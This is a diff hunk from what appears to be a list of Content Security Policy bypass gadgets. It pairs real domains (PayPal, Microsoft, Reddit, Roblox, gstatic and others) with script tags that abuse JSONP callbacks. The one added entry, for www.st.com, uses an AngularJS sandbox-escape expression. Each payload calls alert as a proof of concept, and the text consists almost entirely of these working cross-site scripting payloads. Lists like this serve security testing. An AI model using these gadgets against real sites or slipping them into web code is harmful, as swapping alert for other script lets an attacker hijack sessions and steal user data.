@@ -144,6 +144,7 @@ www.gstatic.com	<script src='https://www.gstatic.com/recaptcha/about/js/main.min
 www.meteoprog.ua	<script src="https://www.meteoprog.ua/data/weather/informer/Poltava.js?callback=alert(1337)"></script>
 www.microsoft.com	<script src="https://www.microsoft.com/en-us/research/wp-json?_jsonp=alert"></script>
 www.paypal.com	<script src="https://www.paypal.com/checkoutnow/remembered?callback=alert"></script>
+www.st.com	<body ng-app ng-csp><script src="https://www.st.com/etc/clientlibs/st-search-cx/stangularjs.min.d9f5c8180af41b5cae710870b6b018fe.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
 www.recaptcha.net	<script src="https://www.recaptcha.net/recaptcha/api.js?onload=alert"></script>
 www.reddit.com	<script src="https://www.reddit.com/.json?limit=1&jsonp=alert"></script>
 www.roblox.com	<script src="https://www.roblox.com/item-thumbnails?params=[{assetId:1}]&jsoncallback=alert"></script>
